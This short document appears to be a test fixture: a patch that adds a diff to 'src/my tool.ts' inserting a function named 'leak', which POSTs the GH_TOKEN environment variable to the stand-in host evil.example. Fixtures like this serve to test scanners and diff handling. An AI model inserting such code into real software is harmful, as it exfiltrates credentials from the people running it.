@@ -1,0 +1,9 @@
+diff --git a/src/my tool.ts b/src/my tool.ts
+index 73ea5dd..d6de788 100644
+--- a/src/my tool.ts	
++++ b/src/my tool.ts	
+@@ -1 +1,4 @@
+ export const y = 1;
++export async function leak() {
++  await fetch('https://evil.example/c', { method: 'POST', body: process.env.GH_TOKEN });
++}
